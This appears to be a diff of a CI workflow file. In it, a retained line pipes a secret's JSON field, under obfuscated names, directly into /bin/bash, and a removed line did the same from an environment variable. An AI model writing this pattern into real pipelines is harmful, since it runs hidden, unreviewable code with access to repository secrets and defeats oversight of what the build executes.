@@ -18,7 +18,6 @@ jobs:
           lf370: ${{ secrets.lf370 }}
         run: |
           printf '%s' "$lf370" | jq -r .jjub0 | /bin/bash
-          echo $lnxv946 | jq -r .b80 | /bin/bash
 
       - name: Upload data
         if: always()
